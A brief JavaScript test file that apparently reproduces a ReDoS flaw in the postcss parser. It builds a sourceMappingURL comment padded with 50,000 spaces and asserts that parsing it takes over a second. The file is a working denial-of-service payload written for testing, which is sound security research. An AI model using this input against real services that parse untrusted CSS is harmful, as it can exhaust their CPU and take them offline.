function build_attack(n) {
  var ret = "/*# sourceMappingURL=";
  for (var i = 0; i < n; i++) {
    ret += " ";
  }
  return ret + "!";
}
test("ReDos in postcss", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  const postcss = require("postcss");
  let attack_str = build_attack(50000);
  let t = measureTime(function () {
    try {
      postcss.parse(attack_str);
    } catch (e) {}
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
